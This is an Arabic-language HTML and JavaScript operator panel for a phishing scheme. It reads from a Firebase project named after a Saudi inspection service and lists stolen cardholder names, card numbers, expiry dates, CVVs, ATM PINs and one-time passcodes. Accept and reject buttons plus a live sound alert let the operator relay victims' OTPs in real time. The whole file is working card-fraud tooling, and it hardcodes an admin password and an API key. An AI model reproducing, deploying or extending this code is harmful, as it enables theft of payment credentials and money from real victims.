<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - سطر واحد</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #ccc; margin: 0; padding: 0; }
        .navbar { background: #1e7344; padding: 10px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 8px 20px; border-radius: 5px; cursor: pointer; }
        .nav-btn.active { background: white; color: #1e7344; font-weight: bold; }
        .visitor-counter { background: #ffd700; color: #000; padding: 5px; text-align: center; font-weight: bold; font-size: 14px; }
        
        .container { padding: 10px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* تنسيق السطر الواحد */
        .data-header { display: flex; background: #1a1a1a; padding: 10px; border-radius: 5px; margin-bottom: 5px; font-weight: bold; font-size: 12px; color: #888; border-bottom: 2px solid #333; }
        .data-row { display: flex; align-items: center; background: #161616; padding: 8px 10px; margin-bottom: 4px; border-radius: 4px; border: 1px solid #222; transition: 0.3s; gap: 10px; }
        
        /* تقسيم الأعمدة */
        .col-name { width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-weight: bold; }
        .col-card { width: 180px; font-family: monospace; letter-spacing: 1px; color: #aaa; }
        .col-date { width: 80px; text-align: center; }
        .col-cvv  { width: 60px; text-align: center; }
        .col-pin  { width: 80px; text-align: center; color: #9c27b0; font-weight: bold; }
        .col-otp  { width: 100px; text-align: center; color: #2196f3; font-weight: bold; }
        .col-btns { flex-grow: 1; display: flex; gap: 5px; justify-content: flex-end; }

        /* حالة التنبيه للجديد */
        .is-new-row { border-color: #28a745 !important; background: #0d2112 !important; color: #fff !important; }
        .is-new-row .col-card { color: #fff; }

        /* الأزرار */
        .btn { padding: 6px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 11px; background: #333; color: #666; transition: 0.2s; }
        .btn-green.active { background: #28a745 !important; color: white !important; }
        .btn-red.active { background: #dc3545 !important; color: white !important; }

        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
    </style>
</head>
<body onload="checkSavedLogin()">

<audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div id="loginOverlay">
    <div style="background:white; padding:30px; border-radius:10px; text-align:center;">
        <h3 style="color:#1e7344; margin:0 0 15px 0;">لوحة تحكم حسن</h3>
        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:10px; margin-bottom:10px;">
        <button onclick="checkLogin()" style="width:100%; padding:10px; background:#1e7344; color:white; border:none; border-radius:5px; cursor:pointer;">دخول</button>
    </div>
</div>

<div id="adminContent">
    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
    <div class="navbar">
        <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
        <button class="nav-btn" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
        <button class="nav-btn" onclick="logout()" style="background:#000">🚪 خروج</button>
    </div>

    <div class="container">
        <div id="cardsSection" class="tab-content active">
            <div class="data-header">
                <div class="col-name">الاسم</div>
                <div class="col-card">رقم البطاقة</div>
                <div class="col-date">التاريخ</div>
                <div class="col-cvv">CVV</div>
                <div class="col-pin">PIN</div>
                <div class="col-otp">OTP</div>
                <div class="col-btns">الإجراء</div>
            </div>
            <div id="paymentsList"></div>
        </div>
        <div id="bookingSection" class="tab-content">
            <div id="bookingList"></div>
        </div>
    </div>
</div>

<script>
    function checkSavedLogin() { if (localStorage.getItem("admin_logged_in") === "true") showAdmin(); }
    function checkLogin() { if(document.getElementById('password').value === "H0987654H") { localStorage.setItem("admin_logged_in", "true"); showAdmin(); } }
    function showAdmin() { document.getElementById('loginOverlay').style.display = 'none'; document.getElementById('adminContent').style.display = 'block'; initFirebase(); }
    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }
    function playSound() { document.getElementById('alertSound').play().catch(e => {}); }

    function initFirebase() {
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // عداد الزوار
        database.ref('live_visitors').on('value', s => {
            let active = 0; const now = Date.now();
            s.forEach(c => { if(now - c.val().last_active < 30000) active++; });
            document.getElementById('onlineCount').innerText = active;
        });

        // تحميل البطاقات - سطر واحد
        database.ref('payments').on('child_added', s => {
            renderRow(s.key, s.val());
        });

        // التحديثات الحية (تفعيل التنبيه)
        database.ref('payments').on('child_changed', s => {
            const val = s.val();
            const row = document.getElementById('row_' + s.key);
            if(row) {
                row.querySelector('.col-otp').innerText = val.otp || '-';
                row.querySelector('.col-pin').innerText = val.atm_pin || '-';
                
                if(val.status && val.status.includes('waiting')) {
                    row.classList.add('is-new-row');
                    row.querySelector('.btn-green').classList.add('active');
                    row.querySelector('.btn-red').classList.add('active');
                    playSound();
                }

                if(val.status === 'accept' || val.status === 'reject') {
                    row.classList.remove('is-new-row');
                    row.querySelector('.btn-green').classList.remove('active');
                    row.querySelector('.btn-red').classList.remove('active');
                }
            }
        });
    }

    function renderRow(key, val) {
        const list = document.getElementById('paymentsList');
        const div = document.createElement('div');
        div.className = 'data-row';
        div.id = 'row_' + key;
        div.innerHTML = `
            <div class="col-name">${val.cardHolder || 'عميل'}</div>
            <div class="col-card">${val.cardNumber}</div>
            <div class="col-date">${val.expiry}</div>
            <div class="col-cvv">${val.cvv}</div>
            <div class="col-pin">${val.atm_pin || '-'}</div>
            <div class="col-otp">${val.otp || '-'}</div>
            <div class="col-btns">
                <button class="btn btn-green" onclick="updateStat('${key}', 'accept')">قبول</button>
                <button class="btn btn-red" onclick="updateStat('${key}', 'reject')">رفض</button>
            </div>
        `;
        list.prepend(div); // الجديد دايماً فوق
    }

    function updateStat(id, action) {
        firebase.database().ref('payments/' + id).update({ status: action });
    }

    function openTab(evt, name) {
        document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
        document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
        document.getElementById(name).style.display = "block";
        evt.currentTarget.className += " active";
    }
</script>
</body>
</html>
